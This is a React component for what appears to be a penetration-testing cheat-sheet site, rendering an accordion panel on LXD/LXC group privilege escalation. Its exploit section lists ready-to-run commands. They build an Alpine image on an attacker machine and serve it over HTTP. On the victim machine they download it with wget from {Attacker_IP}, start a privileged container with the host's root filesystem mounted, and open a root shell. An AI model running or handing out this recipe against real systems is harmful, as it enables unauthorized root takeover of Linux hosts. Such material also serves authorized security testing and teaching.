import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import { docco } from "react-syntax-highlighter/dist/esm/styles/hljs";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const LXD = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Requirments</Typography>
            <Typography>
              If you belong to lxd or lxc group, you can become root.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Description</Typography>
            <Typography>
              LXD is a next generation system container manager. It offers a
              user experience similar to virtual machines but using Linux
              containers instead.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Exploit</Typography>
            <Typography>Attacker Machine:</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools\n" +
                "sudo git clone https://github.com/lxc/distrobuilder\n" +
                "cd distrobuilder\n" +
                "make\n" +
                "sudo mkdir -p ../ContainerImages/alpine/\n" +
                "cd ../ContainerImages/alpine/\n" +
                "sudo wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml\n" +
                "sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8\n" +
                "python3 -m http.server 8000"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Exploit</Typography>
            <Typography>Victim Machine:</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"wget http://{Attacker_IP}:8000/lxd.tar.xz\n" +
                "wget http://{Attacker_IP}:8000/rootfs.squashfs\n" +
                "lxc image import lxd.tar.xz rootfs.squashfs --alias alpine\n" +
                "lxc image list\n" +
                "lxc init alpine privesc -c security.privileged=true\n" +
                "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\n" +
                "lxc start privesc\n" +
                "lxc exec privesc /bin/sh\n"}
            </SyntaxHighlighter>
            <Typography>
              You now have root priviledges and the whole filesystem is mounted
              in /mnt/root/
            </Typography>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default LXD;
